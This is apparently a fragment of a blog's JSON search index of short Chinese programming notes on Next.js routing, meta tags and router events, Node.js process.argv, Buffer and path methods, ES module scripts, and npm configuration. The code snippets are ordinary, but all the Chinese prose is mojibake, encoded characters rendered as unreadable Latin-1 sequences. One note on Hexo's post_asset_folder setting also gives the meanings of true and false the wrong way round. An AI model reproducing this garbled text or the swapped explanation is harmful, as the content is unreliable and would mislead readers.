&lt;div&gt; &lt;Link href='/'&gt; &lt;a&gt;Home&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/about'&gt; &lt;a&gt;About&lt;/a&gt; &lt;/Link&gt; &lt;Link href='/list'&gt; &lt;a&gt;List&lt;/a&gt; &lt;/Link&gt; &lt;/div&gt; )} é™„è¨»ï¼š Next.js 12.2 ä»¥å‰æ‰éœ€è¦æŠŠ &lt;a&gt; åŒ…åœ¨ &lt;Link&gt; ä¸­ é›–ç„¶ä¸€æ¨£æœ‰ç”¨åˆ° &lt;a&gt;ï¼Œå¯æ˜¯æ³¨æ„ href æ˜¯å¯«åœ¨ &lt;Link&gt; èº«ä¸Šã€‚ &lt;Link&gt; çš„ç”¨æ„æ˜¯ Next æœƒåœ¨èƒŒå¾Œå¹«ä½ ç”¨å¾ˆåƒã€ŒSPAã€çš„æ–¹å¼ä¾†æ›é ï¼Œä¸éä¸€æ¨£æœƒåš SSRã€‚ é€™é‚Šä¾†çœ‹ä¸€å¼µåœ–ï¼š é€™é‚Šå¯ä»¥æ³¨æ„åˆ°å¹¾ä»¶äº‹ï¼š æ²’æœ‰é‡æ–°æ•´ç†ï¼ˆé€™ä¸€é»å¾ˆåƒ SPAï¼ŒæŠ€è¡“ä¸Šç¨±ç‚º ã€Œclient-side navigationã€ï¼‰ åŸå§‹ç¢¼å¯ä»¥çœ‹åˆ°æ›´æ–°å¾Œçš„å…§å®¹ï¼ˆè­‰æ˜é€™æ˜¯ SSRï¼‰ about.js æ˜¯åœ¨æˆ‘å€‘åˆ°ã€Œé‚£å€‹é é¢ã€æ™‚æ‰å»ç™¼ request å–å¾—çš„ï¼ˆæŠ€è¡“ä¸Šæœƒç¨±ç‚º Code splittingï¼‰ æ‰€ä»¥é€™å°±æ˜¯ç”¨ &lt;Link&gt; çš„å¥½è™•ï¼Œé‚„æœ‰ä»–èƒŒå¾Œå¹«ä½ åšçš„äº‹æƒ…ï¼Œé€™äº›æ˜¯å–®ç´”ç”¨ &lt;a&gt; åšä¸åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰éœ€è¦ä»–ã€‚","link":"/2022/09/01/next-link/"},{"title":"Next.jsï¼meta æ¨™ç±¤","text":"é›–ç„¶ç›®å‰é‚„ä¸å¸¸ç”¨åˆ°å®ƒï¼Œä¸éé‚„æ˜¯ç­è§£ä¸€ä¸‹æ¯”è¼ƒå¥½ã€‚ ç°¡è¿°æ—¢ç„¶éƒ½ç”¨ next äº†ï¼Œé‚£éº¼ meta æ¨™ç±¤å°±è®Šæˆæ˜¯è »é‡è¦çš„ä¸€å€‹éƒ¨åˆ†ã€‚é€™é‚Šå¯ä»¥é€é next å…§å»ºçš„ &lt;Head&gt; ä¾†è™•ç†ï¼š 1234567891011121314import Head from 'next/head'export default function about() { return ( &lt;&gt; &lt;Head&gt; &lt;title&gt;PeaNu | About&lt;/title&gt; &lt;/Head&gt; &lt;div&gt; &lt;h1&gt;About&lt;/h1&gt; &lt;p&gt;...&lt;/p&gt; &lt;/&gt; )} é€™æ¨£å­ç•¶æˆ‘åœ¨ /about é€™å€‹é é¢æ™‚å°±æœƒå‡ºç¾ &lt;title&gt;ã€‚","link":"/2022/09/09/next-meta-tag/"},{"title":"Next.jsï¼é‡æ–°å°å‘ï¼ˆrouterï¼‰","text":"å¾ˆç†Ÿæ‚‰çš„æ±è¥¿ã€‚ ç°¡è¿°Next ä¸­ä¹Ÿæœ‰æä¾› router çš„åŠŸèƒ½ï¼Œéå¸¸æœ‰ React çš„å‘³é“ï¼š 1234567891011121314151617181920212223242526import Link from 'next/link'import { useRouter } from 'next/router'import React, { useEffect } from 'react'export default function NotFound() { const router = useRouter() useEffect(() =&gt; { setTimeout(() =&gt; { router.push('/') }, 2000) }, []) return ( &lt;div className='not-found'&gt; &lt;h1&gt;Ooops...&lt;/h1&gt; &lt;h2&gt;That page cannot be found :(&lt;/h2&gt; &lt;p&gt; Go back to the{' '} &lt;Link href='/'&gt; &lt;a&gt;Homepage&lt;/a&gt; &lt;/Link&gt; &lt;/p&gt; &lt;/div&gt; )}","link":"/2022/09/04/next-redirect/"},{"title":"Next.jsï¼Router Hooks","text":"åˆ°äº† SSR ä»¥å¾Œå°±æœƒéœ€è¦ç”¨åˆ°å®ƒã€‚ ç°¡è¿°åœ¨ SSR çš„ä¸–ç•Œè£¡é¢å¯¦ä½œã€ŒLoadingã€æ•ˆæœçš„æ–¹å¼è·Ÿ CSR ä¸å¤ªä¸€æ¨£ã€‚ æƒ³æƒ³çœ‹åœ¨ CSR ä¸­ä½ æ˜¯æ€éº¼åšçš„ï¼Ÿæ²’æ„å¤–çš„è©±æ‡‰è©²æ˜¯é€™æ¨£å§ï¼š 12345678910111213141516171819202122function SomePage() { const [loading, setLoading] = useState(true) useEffect(() =&gt; { fetch(...) .then((response) =&gt; response.json()) .then((data) =&gt; { console.log('data', data) setLoading(false) }) .catch((error) =&gt; { console.log('error', error.message) setLoading(false) }) }, []) return loading ? ( &lt;div&gt;Loading...&lt;/div&gt; ) : ( &lt;div&gt;Lorem ipsum&lt;/div&gt; )} é‚è¼¯å°±æ˜¯æŠŠä¸€é–‹å§‹ fetch æ‹¿è³‡æ–™åšåˆå§‹åŒ–çš„é€™æ®µæ™‚é–“è¨­ç‚º loading æ•ˆæœï¼Œç­‰æ‹¿åˆ°çµæœå¾Œåœ¨æ›´æ–° stateã€‚ But åœ¨ SSR è£¡é¢ä¸æœƒæœ‰ fetch é€™ä»¶äº‹ï¼Œå› ç‚ºè³‡æ–™åœ¨ Server ç«¯æ™‚å°±æœƒæ¸²æŸ“å®Œäº†ï¼Œæ‰€ä»¥ç­‰åˆ°å…ƒä»¶æ¸²æŸ“æ™‚è³‡æ–™æ—©å°±å·²ç¶“è™•ç†å®Œç•¢äº†ï¼Œæ²’æœ‰æ©Ÿæœƒè®“ä½ é¡¯ç¤º Loading çš„ç‹€æ…‹ã€‚ ä¸é Server åœ¨æ¸²æŸ“çš„é€™æ®µæœŸé–“ç¢ºå¯¦æ˜¯éœ€è¦ç­‰å¾…çš„ï¼Œåªæ˜¯è¦æ›ç¨®æ–¹å¼ä¾†å¯¦ä½œï¼Œå…¶ä¸­ä¸€ç¨®æ–¹å¼å°±æ˜¯é€éã€Œè·¯ç”±äº‹ä»¶ã€ä¾†åˆ¤å®šã€‚ useRouter é™¤äº†æä¾›åŸºæœ¬è·¯ç”±æ“ä½œä»¥å¤–ï¼Œé‚„æœ‰ä»¥ä¸‹äº‹ä»¶å¯ä»¥ç”¨ï¼š routeChangeStart è·¯ç”±é–‹å§‹è·³è½‰æ™‚è§¸ç™¼ routeChangeComplete è·¯ç”±çµæŸè·³è½‰æ™‚è§¸ç™¼ routeChangeError è·¯ç”±è·³è½‰ç™¼ç”ŸéŒ¯èª¤æ™‚è§¸ç™¼ beforeHistoryChange æ­·å²ç´€éŒ„æ”¹è®Šæ™‚è§¸ç™¼ hashChangeStart â€œ#â€ å¾Œçš„è·¯å¾‘é–‹å§‹æ”¹è®Šæ™‚è§¸ç™¼ hashChangeComplete â€œ#â€ å¾Œçš„è·¯å¾‘é–‹å§‹æ”¹è®Šæ™‚è§¸ç™¼ è©³ç´°ä»‹ç´¹å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ï¼Œä¸éæœ€å¸¸ç”¨çš„åŸºæœ¬ä¸Šæ˜¯ routeChangeStart å’Œ routeChangeCompleteã€‚ æœ‰äº†é€™å€‹ event å¾Œè¦å¯¦ä½œ loading å°±å¾ˆè¼•é¬†äº†ï¼Œåªè¦åœ¨ Layout çš„éƒ¨åˆ†æ ¹æ“šäº‹ä»¶ä¾†åšå‡ºåæ‡‰å°±è¡Œäº†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344import Link from 'next/link'import { useRouter } from 'next/router'import { useEffect, useState } from 'react'export default function Layout({ children }) { const router = useRouter() const [loading, setLoading] = useState(false) useEffect(() =&gt; { function onRouteChangeStart() { console.log('routeChangeStart') setLoading(true) } function onRouteChangeComplete() { console.log('routeChangeComplete') setLoading(false) } function onRouteChangeError() { console.log('onRouteChangeError') alert('Ooops! something goes wrong.') setLoading(false) } router.events.on('routeChangeStart', onRouteChangeStart) router.events.on('routeChangeComplete', onRouteChangeComplete) router.events.on('routeChangeError', onRouteChangeError) // ä»¥é€™å€‹ä¾‹å­ä¾†èªªé€™é‚Šä¸éœ€è¦æ¸…é™¤ Effectï¼Œä¸éé‚„æ˜¯é¤Šæˆå¥½ç¿’æ…£æ¯”è¼ƒå¥½ã€‚ return () =&gt; { console.log('clear handler') router.events.off('routeChangeStart', onRouteChangeStart) router.events.off('routeChangeComplete', onRouteChangeComplete) router.events.off('routeChangeError', onRouteChangeError) } }, []) return ( &lt;div className='layout'&gt; &lt;div className='page-content'&gt;{loading ? &lt;div&gt;Loading...&lt;/div&gt; : children}&lt;/div&gt; &lt;/div&gt; )}","link":"/2022/09/05/next-router-hooks/"},{"title":"Next.jsï¼æ¶æ§‹","text":"ä¸€é–‹å§‹å°±æœ‰ React çš„æ„Ÿè¦º ç°¡è¿°ä»¥å¾€æˆ‘å€‘ç”¨ React åšå‡ºä¾†çš„å°ˆæ¡ˆé€šå¸¸éƒ½æ˜¯ã€ŒSPAï¼ˆSingle Page Applicationï¼‰ã€ï¼Œä¸éåˆ°äº† Next å°±ä¸ä¸€æ¨£äº†ï¼Œæœƒè®Šæˆã€ŒMPAï¼ˆMultiple Page Applicationï¼‰ã€ã€‚ å…©å€‹æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ã€ŒSSRã€å’Œã€ŒCSRã€ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹æ˜¯åœ¨ Server ç«¯å…ˆæ¸²æŸ“å¥½ä»¥å¾Œåœ¨å›å‚³ Responseï¼Œå¦ä¸€å€‹å‰‡æ˜¯å…ˆå›å‚³ Respnose å¾Œå†å¾ Client ç«¯æ¸²æŸ“ã€‚å› æ­¤ S å’Œ R çš„å°±æ˜¯ä»£è¡¨ã€ŒServerã€èˆ‡ã€ŒClientã€çš„æ„æ€ã€‚ è³‡æ–™å¤¾çµæ§‹é¦–å…ˆç”¨ create-next-app å»ºç«‹å¥½çš„å°ˆæ¡ˆæœƒé•·é€™æ¨£ï¼š 123456789101112131415â”œâ”€â”€ README.mdâ”œâ”€â”€ next.config.jsâ”œâ”€â”€ package.jsonâ”œâ”€â”€ pagesâ”‚&nbsp;&nbsp; â”œâ”€â”€ _app.jsâ”‚&nbsp;&nbsp; â”œâ”€â”€ apiâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ hello.jsâ”‚&nbsp;&nbsp; â””â”€â”€ index.jsâ”œâ”€â”€ publicâ”‚&nbsp;&nbsp; â”œâ”€â”€ favicon.icoâ”‚&nbsp;&nbsp; â””â”€â”€ vercel.svgâ”œâ”€â”€ stylesâ”‚&nbsp;&nbsp; â”œâ”€â”€ Home.module.cssâ”‚&nbsp;&nbsp; â””â”€â”€ globals.cssâ””â”€â”€ yarn.lock åŸºæœ¬ä¸Šéƒ½è·Ÿ CRAï¼ˆcreate-react-appï¼‰å·®ä¸å¤šï¼Œä¸éæœ‰å¹¾å€‹åœ°æ–¹ä¸åŒï¼š æ²’æœ‰ srcï¼Œè®Šæˆ pages äº† public ä¸­ä¸æœƒå†æœ‰ index.html å‰é¢æœ‰èªªé Next æ˜¯ä¸€å¥— SSR æ¡†æ¶ï¼Œä»£è¡¨æˆ‘å€‘æ‰€æœ‰çš„æ±è¥¿éƒ½ã€Œå¿…é ˆåœ¨ Server ç«¯å°±è™•ç†å¥½ã€ï¼Œæ‰€ä»¥ä¸æœƒå†è·Ÿ CSR ä¸€æ¨£å…ˆç”¢ç”Ÿä¸€å€‹ç©ºæ®¼ï¼ˆindex.htmlï¼‰å†åšæ¸²æŸ“ã€‚ å–è€Œä»£ä¹‹çš„æ˜¯ pages é€™å€‹è³‡æ–™å¤¾ï¼ŒNext æœƒè‡ªå‹•ä¾æ“šè£¡é¢çš„ã€Œæª”æ¡ˆåç¨±ã€ä¾†ç”¢ç”Ÿå°æ‡‰çš„ã€ŒRouteã€ã€‚ä¾‹å¦‚èªªæˆ‘æ–°å¢äº† about.jsï¼Œé‚£å°±æœƒå¤šå‡º /about é€™å€‹ç¶²å€ï¼Œindex.js ä¹Ÿæ˜¯ä¸€æ¨£çš„é“ç†ï¼Œåªæ˜¯ä¸€èˆ¬ index å°±ä»£è¡¨æ ¹ç›®éŒ„ï¼Œæ‰€ä»¥ç¶²å€æœƒæ˜¯ / è€Œä¸æ˜¯ /indexã€‚ ç¸½ä¹‹åŸºæœ¬çš„ next æ¶æ§‹å°±é•·é€™æ¨£ï¼Œæ¥è‘—æœƒä¸€ç¯‡ä¸€ç¯‡è§£é‡‹å…¶ä»–çš„ç›¸é—œåŠŸèƒ½ã€‚","link":"/2022/08/31/next-setup/"},{"title":"åœ¨ Node æŒ‡ä»¤ä¸­å¸¶å…¥åƒæ•¸","text":"å¥½ç”¨çš„ APIã€‚ ProcessNode è£¡é¢æœ‰æä¾›ä¸€å€‹ Process çš„æ¨¡çµ„ï¼Œå…¶ä¸­ process.argv é€™å€‹å±¬æ€§å¯ä»¥å­˜å–ä½ åœ¨ç”¨ node æŒ‡ä»¤æ™‚æ‰€å¸¶å…¥çš„åƒæ•¸ï¼š å‡è¨­æˆ‘åŸ·è¡Œ node index.js 1ï¼š 12const process = require('process')console.log(process.argv) è¼¸å‡ºçµæœæœƒå¾—åˆ°ä¸€å€‹é™£åˆ—ï¼š 1[ 'D:\\\\Program\\\\Node.js\\\\node.exe', 'D:\\\\test_folder\\\\index.js', '1' ] æ‡‰è©²å¾ˆç†Ÿé€™å€‹æ ¼å¼å§ï¼Ÿ node æŒ‡ä»¤çš„åŸ·è¡Œæª”æ¡ˆ index.js çš„åŸ·è¡Œæª”æ¡ˆä½ç½® å¸¶å…¥çš„å­—ä¸² 1 ç›¸ä¿¡ç†ŸçŸ¥ JavaScript çš„ä½ å°±çŸ¥é“æ¥ä¸‹ä¾†è©²æ€éº¼åšäº†ã€‚ ä¸€å€‹ä¸²æ¥ API çš„ç¤ºç¯„ç°¡å–®æ‹¿ reqres é€™å€‹ API ä¾†åšç¤ºç¯„ï¼š 12345678const request = require('request') // å¼•å…¥ä¸‹è¼‰çš„ request æ¨¡çµ„ const { argv } = require('process') // æŠŠ argv è§£æ§‹å‡ºä¾†// users å¾Œé¢æ¥çš„æ˜¯ IDrequest( `https://reqres.in/api/users/${argv[2]}`, (error, response, body) =&gt; console.log(JSON.parse(body))) æ¥è‘—åŸ·è¡Œ node index.js 1ï¼š 12345678910111213{ data: { id: 1, email: 'george.bluth@reqres.in', first_name: 'George', last_name: 'Bluth', avatar: 'https://reqres.in/img/faces/1-image.jpg' }, support: { url: 'https://reqres.in/#support-heading', text: 'To keep ReqRes free, contributions towards server costs are appreciated!' }} å°±é †åˆ©å®Œæˆå›‰ï¼","link":"/2022/01/03/node-argument/"},{"title":"Node ä¸­çš„ buffer æ¨¡çµ„","text":"æ–¹ä¾¿é€²è¡Œç·¨ç¢¼è™•ç†ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªï¼ŒBuffer æ˜¯ä¸€ç¨®ã€ŒäºŒé€²ä½çš„è³‡æ–™æ ¼å¼ã€ã€‚ JavaScript è£¡é¢æ²’æœ‰å…§å»ºçš„é€™ç¨®è³‡æ–™å‹æ…‹ï¼Œæ‰€ä»¥ Node.js ä¸­å¼•å…¥äº† Buffer æ¨¡çµ„ä¾†è®“ JavaScript å¯ä»¥è™•ç†äºŒé€²ä½çš„è³‡æ–™ã€‚ è©³ç´°å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ æŠŠæ–‡å­—è½‰æ›æˆ base64ä½¿ç”¨ Buffer.from('string', 'decode')ï¼Œå‰é¢æ˜¯åŸå­—ä¸²ï¼Œå¾Œé¢æ˜¯ç”¨ä»€éº¼ç·¨ç¢¼ä¾†è®€å–å­—ä¸²ï¼š å‚™è¨»ï¼šä¸å¼•å…¥å…¶å¯¦ä¹Ÿæ²’é—œä¿‚ï¼Œå› ç‚ºåœ¨ Node.js ä¸­ Buffer æ˜¯å…¨åŸŸè®Šæ•¸ 1234// åˆ©ç”¨è§£æ§‹å¼•å…¥ Buffer.Bufferconst { Buffer } = require('buffer')const encodeToBase64 = Buffer.from('abc', 'utf8').toString('base64') console.log(encodeToBase64) // YWJj æ‡‰ç”¨åœ¨ http base authentication12345678// YWRtaW46YWRtaW4xMjMconst credentials = Buffer.from('admin:admin123').toString('base64') request({ url: 'http://example.com/api', headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=' }})","link":"/2022/01/10/node-buffer-module/"},{"title":"Node æŒ‡å®šæª”æ¡ˆè·¯å¾‘","text":"è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°åœ¨æŸäº›ç’°å¢ƒä¸‹æœƒé™åˆ¶è·¯å¾‘å¿…é ˆæ˜¯çµ•å°è·¯å¾‘ï¼Œä¾‹å¦‚ webpack.config.js çš„ outputã€‚ä½†é€™æ¨£å¾ˆä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥å¯ä»¥é€é Node.js æä¾›çš„ path ä¾†åšè¨­å®šã€‚ å‡è¨­æˆ‘å¸Œæœ›è¼¸å‡ºè·¯å¾‘æ˜¯ test_folder/outputï¼Œå¯ä»¥é€™æ¨£å¯«ï¼š 123const path = require('path');// è¼¸å‡ºè·¯å¾‘ï¼š D:\\test_folder\\outputconsole.log('è¼¸å‡ºè·¯å¾‘ï¼š', path.resolve(__dirname, './output')); __dirname ä»£è¡¨ç›®å‰çš„æ ¹è·¯å¾‘ï¼ˆtest_folderï¼‰ï¼Œå¾Œé¢å°±æ˜¯è¦æ‹šæ¥ä¸Šå»çš„è·¯å¾‘ã€‚","link":"/2022/02/21/node-path/"},{"title":"Node.js ä¸­çš„ path ç›¸é—œæ–¹æ³•","text":"å°±æ˜¯å€‹æ‡¶äººåŒ… ç°¡è¿°å¾ˆå¤šè¨­å®šæª”æ¡ˆéƒ½æœƒç”¨åˆ°è·Ÿ path æœ‰é—œçš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘æƒ³å¯«ä¸€ç¯‡è¨˜ä¸‹ä¾†ã€‚ é€™é‚Šæœƒå‡è¨­æˆ‘ç›®å‰çš„è·¯å¾‘ç‚º D:\\test_folderï¼Œä¸¦ä¸”ç”¨ D:\\test_folder\\index.js ä¾†åŸ·è¡Œã€‚ __dirname ç›®å‰æ‰€åœ¨çš„è·¯å¾‘ï¼ˆä¸åŒ…å«æª”æ¡ˆï¼‰ 1console.log(__dirname); // D:\\test_folder __filename ç›®å‰æ‰€åœ¨çš„è·¯å¾‘ï¼ˆåŒ…å«æª”æ¡ˆï¼‰ 1console.log(__filename); // D:\\test_folder\\index.js path.join å…¶å¯¦å°±æ˜¯æ‹šè·¯å¾‘éŠæˆ² 12// D:\\test_folder\\ + 'public' + 'index.js' console.log(path.join(__dirname, 'public', 'index.js')); path.resolve ç›´æ¥å¾æ ¹ç›®éŒ„å¾€ä¸‹æ‹¼æ¥ï¼ˆä¸ç®¡ index.js æ”¾åœ¨å“ªå€‹è³‡æ–™å¤¾ï¼‰ 12// D:\\test_folder\\config\\database.jsonconsole.log(path.resolve('config', 'database.json')) path.basename(pathName) æ ¹æ“šå‚³å…¥è·¯å¾‘ï¼Œæˆªå‡ºæœ€å°¾ç«¯çš„éƒ¨åˆ† 12console.log(path.basename(__dirname)); // test_folder console.log(path.basename(__filename)); // index.js","link":"/2022/04/02/nodejs-path-api/"},{"title":"<script> æœ‰æ²’æœ‰ module å±¬æ€§çš„å·®åˆ¥","text":"ä¹Ÿæ˜¯å¶ç„¶å­¸åˆ°è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°æœ¬ä¾†æ˜¯å¥½å¥‡é€™å…©å€‹æœ‰ä»€éº¼å·®ç•°ï¼š 123456&lt;!-- ç”¨ src å¼•å…¥ --&gt;&lt;script src=\"myModule\"&gt;&lt;/script&gt;&lt;!-- ç”¨ ES6 module å¼•å…¥ --&gt;&lt;script type=\"module\"&gt; import { module } from './myModule';&lt;/script&gt; ä½†ç¢°å·§çœ‹åˆ°é€™ç¯‡ æ–‡ç«  å­¸åˆ°è »å¤šæˆ‘ä¸çŸ¥é“çš„ç´°ç¯€ï¼Œæ‰€ä»¥æ‰å¯«é€™ç¯‡ã€‚ å¦å¤–é€™å…©å€‹æœ€ä¸»è¦çš„å·®ç•°æ‡‰è©²æ˜¯ scopeï¼Œç­‰ä¸€ä¸‹æœƒè§£é‡‹å·®åœ¨å“ªã€‚ module çš„ä½œç”¨åŸŸåªåœ¨ &lt;script&gt; ä¸­æ²’è¾¦æ³•åœ¨å…¶ä»– &lt;script&gt; ä¸­å­˜å– module è£¡çš„è®Šæ•¸æˆ–å‡½å¼ï¼š 123456789&lt;script type=\"module\"&gt; function add(a, b) { return a + b; }&lt;/script&gt;&lt;script&gt; // Uncaught ReferenceError: add is not defined console.log(add(10, 10));&lt;/script&gt; å¼·èª¿ä¸€ä¸‹æ˜¯ã€Œåªæœ‰è¨­å®š type=module çš„ JSã€æ‰æœ‰ &lt;script&gt; ä½œç”¨åŸŸï¼Œæ‰€ä»¥ä»¥ä¸‹ä¾‹å­æ˜¯ OK çš„ï¼š 12345678&lt;script&gt; function add(a, b) { return a + b; }&lt;/script&gt;&lt;script type=\"module\"&gt; console.log(add(10, 10)); // 20&lt;/script&gt; module ä¸­çš„å…§å®¹æœƒä»¥åš´æ ¼æ¨¡å¼ä¾†åŸ·è¡Œ12345&lt;script type=\"module\"&gt; console.log(this); // undefined a = 100; // æ²’æœ‰ç”¨ var ä¾†å®£å‘Š console.log(a) // Uncaught ReferenceError: a is not defined&lt;/script&gt; ä¸€èˆ¬çš„ &lt;script&gt;ï¼š 12345&lt;script&gt; console.log(this); // window a = 100; // æ²’æœ‰ç”¨ var ä¾†å®£å‘Š console.log(a) // 100&lt;/script&gt; åªæœ‰ module æ‰å¯ä»¥ç”¨ ES6 æ¨¡çµ„12345&lt;script type=\"module\"&gt; // å¼•å…¥å¯«å¥½çš„æ¨¡çµ„ import { multiple } from './getElement.js'; console.log(multiple(10, 5)) // 50&lt;/script&gt; ä¸€èˆ¬çš„ &lt;script&gt;ï¼š 12345&lt;script&gt; // Uncaught SyntaxError: Cannot use import statement outside a module import { multiple } from './getElement.js'; console.log(multiple(10, 5))&lt;/script&gt; module é è¨­å°±æœ‰ defer æ•ˆæœä¸çŸ¥é“ defer çš„æ•ˆæœåƒè€ƒé€™ç¯‡ï¼šèªè­˜ &lt;script&gt; ä¸­çš„ async èˆ‡ defer å±¬æ€§ 123456&lt;script type=\"module\"&gt; // &lt;button&gt;yo&lt;/button&gt; console.log(document.querySelector('button'));&lt;/script&gt;&lt;button&gt;yo&lt;/button&gt; ä¸€èˆ¬çš„ &lt;script&gt;ï¼š 123456&lt;script&gt; // null console.log(document.querySelector('button'));&lt;/script&gt;&lt;button&gt;yo&lt;/button&gt; module å¯ä»¥è¨­å®š async å±¬æ€§ï¼Œç„¶å¾Œä¸€æ¨£å¯« inline scriptå› ç‚ºä¸€èˆ¬ &lt;script&gt; çš„ async åƒ…é™æ–¼ç”¨ src è«‹æ±‚è³‡æºçš„æƒ…æ³ï¼Œä¸èƒ½å¯« inline scriptï¼Œä½† module æ‰“ç ´äº†é€™å€‹é™åˆ¶ï¼š 1234567&lt;script type=\"module\" async&gt; import { multiple } from './getElement.js'; // inline script console.log(multiple(10, 5)); // 50&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;","link":"/2022/02/12/normal-script-and-module-script-difference/"},{"title":"NPM çš„åœ–ç‰‡è³‡æ–™å¤¾è¨­å®š","text":"é—œæ–¼ NPM çš„ä¸€å€‹è¨­å®šã€‚ å…¶å¯¦æ­£ç¢ºä¾†èªªé€™å€‹è¨­å®šæ˜¯ç”¨ä¾†è¨­å®šä¸€ç¯‡æ–‡ç« çš„ asset è³‡æ–™å¤¾ï¼ˆåŠŸèƒ½ï¼‰è¦é–‹é‚„æ˜¯é—œï¼Œä½†é€™å€‹è³‡æ–™å¤¾å¤§å¤šæ•¸æˆ‘éƒ½æ‹¿ä¾†æ”¾åœ–ç‰‡ï¼Œæ‰€ä»¥å°±æŠŠä»–ç•¶ä½œæ˜¯åœ–ç‰‡çš„è³‡æ–™å¤¾è¨­å®šå§ã€‚ é¦–å…ˆï¼Œåœ¨ hexo çš„æ ¹ç›®éŒ„ä¸‹å¯ä»¥æ‰¾åˆ°ã€Œ_config.ymlã€æª”æ¡ˆï¼Œé€™è£¡é¢æœ‰ä¸€å€‹è¨­å®šæ˜¯ï¼š 1post_asset_folder: false false = å»ºç«‹æ–°æ–‡ç« çš„æ™‚å€™ï¼Œä½¿ç”¨ asset åŠŸèƒ½ï¼Œå»ºç«‹æ–‡ç« æ™‚è‡ªå‹•å»ºç«‹ä¸€å€‹åŒåçš„ asset è³‡æ–™å¤¾true = å»ºç«‹æ–°æ–‡ç« çš„æ™‚å€™ï¼Œä¸ä½¿ç”¨ asset åŠŸèƒ½ï¼Œå»ºç«‹æ–‡ç« æ™‚ä¸æœƒå»ºç«‹ asset è³‡æ–™å¤¾ asset è³‡æ–™å¤¾å°±æ˜¯ç”¨ä¾†æ”¾é€™ç¯‡æ–‡ç« å¯èƒ½æœƒç”¨åˆ°çš„åœ–ç‰‡ã€å½±ç‰‡ä¹‹é¡çš„æ±è¥¿ã€‚ å…¶å¯¦åªæ˜¯å»ºç«‹ä¸€å€‹è³‡æ–™å¤¾ï¼Œç„¶å¾Œåç¨±è¨­æˆè·Ÿæ–‡ç« æª”æ¡ˆçš„åç¨±ç›¸åŒå°±æœƒè‡ªå‹•å°æ‡‰åˆ°äº†ã€‚æ‰€ä»¥ä½ ä¹Ÿå¯ä»¥ä¸ç”¨ç®¡é€™å€‹è¨­å®šï¼Œè‡ªå·±æœ‰éœ€è¦çš„æ™‚å€™å†å»ºç«‹ä¹Ÿæ˜¯ OKã€‚ æ¨“ä¸Šå”¬çˆ›ï¼Œæ­£ç¢ºçš„ä½œæ³•æ˜¯å¦‚æœä½ è¦ä½¿ç”¨ asset è³‡æ–™å¤¾çš„åŠŸèƒ½ï¼Œåœ¨å»ºç«‹æ–‡ç« ä¹‹å‰è¨˜å¾—è¦å…ˆæŠŠé€™å€‹è¨­å®šæ‰“é–‹ï¼Œé€™æ¨£å­æ‰æœ‰è¾¦æ³•ä½¿ç”¨é€™å€‹åŠŸèƒ½ã€‚ åƒè€ƒè³‡æ–™Hexo åœ–ç‰‡è·¯å¾‘","link":"/2021/12/11/npm-asset-folder-setting/"},{"title":"ä¿®æ”¹ npm å®‰è£ä½ç½®ï¼ˆGlobalï¼‰","text":"éš¨æ‰‹è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°æœƒç¢°åˆ°é€™å•é¡Œæ˜¯å› ç‚ºç•¶åˆåœ¨å®‰è£æŸäº›å¥—ä»¶æ™‚ç¢°åˆ°äº†ã€Œæ¬Šé™ï¼ˆEACCESï¼‰ã€çš„å•é¡Œã€‚ æœ¬ä¾†ä¾ç…§ å®˜æ–¹æ–‡ä»¶ çš„èªªæ³•æ˜¯èªªã€Œä½ å¯ä»¥ä¿®æ”¹ npm global çš„å®‰è£ä½ç½®ã€ï¼Œé€™æ¨£å­å°±å¯ä»¥é¿å…æ‰é€™å€‹å•é¡Œäº†ï¼Œä¸éè©¦å®Œå¾Œå…¶å¯¦çµæœé‚„æ˜¯ä¸€æ¨£ä¸è¡Œ XDï¼Œä¸ç¢ºå®šæ˜¯ä¸æ˜¯å› ç‚ºæˆ‘çš„ node æ˜¯ç”¨ nvm ä¾†å®‰è£çš„é—œä¿‚ã€‚ ç¸½ä¹‹æœ€å¾Œæ˜¯ç›´æ¥å»æ”¹ç³»çµ±æ¬Šé™æ‰è§£æ±ºé€™å•é¡Œã€‚ä¸éæ—¢ç„¶ç™¼ç¾äº†é€™æ±è¥¿å°±é †æ‰‹è¨˜éŒ„ä¸€ä¸‹å§ï¼Œèªªä¸å®šå“ªå¤©æœƒç”¨åˆ°ã€‚ æ­¥é©Ÿ1. è¨­å®š npm çš„å®‰è£ä½ç½® 1npm config set prefix &lt;directory_name&gt; 2. éš¨ä¾¿å®‰è£ä¸€å€‹ global çš„åŒ…ä¾†æ¸¬è©¦ 1npm install -g jshint 3. æª¢æŸ¥å·²å®‰è£çš„å¥—ä»¶ 1npm list -g --depth=0 åŸ·è¡Œé€™é‚Šçš„æ™‚å€™å…¶å¯¦å°±æœƒé¡¯ç¤ºå°æ‡‰çš„è³‡æ–™å¤¾äº†ï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨é€™é‚Šé †ä¾¿çœ‹çœ‹æ˜¯å¦æ­£ç¢ºã€‚","link":"/2022/07/07/npm-change-default-storage/"},{"title":"npm global çš„å®‰è£ä½ç½®","text":"åªæ˜¯çªç„¶æƒ³åˆ°è¨˜ä¸€ä¸‹ã€‚ å°±æ˜¯é€™éº¼ç°¡çŸ­å…¨åŸŸå®‰è£çš„ä½ç½®éƒ½æœƒæ”¾åœ¨é€™è£¡ï¼ˆä»¥æˆ‘çš„é›»è…¦ä¾†çœ‹çš„è©±ï¼‰ï¼š 1C:\\Users\\user\\AppData\\Roaming\\npm\\node_modules","link":"/2022/02/28/npm-global-path/"},{"title":"npm å°çŸ¥è­˜","text":"ç°¡å–®ç´€éŒ„ã€‚ é—œæ–¼ npm init é€™å€‹æŒ‡ä»¤é€™å€‹æŒ‡ä»¤æœƒå¹«ä½ 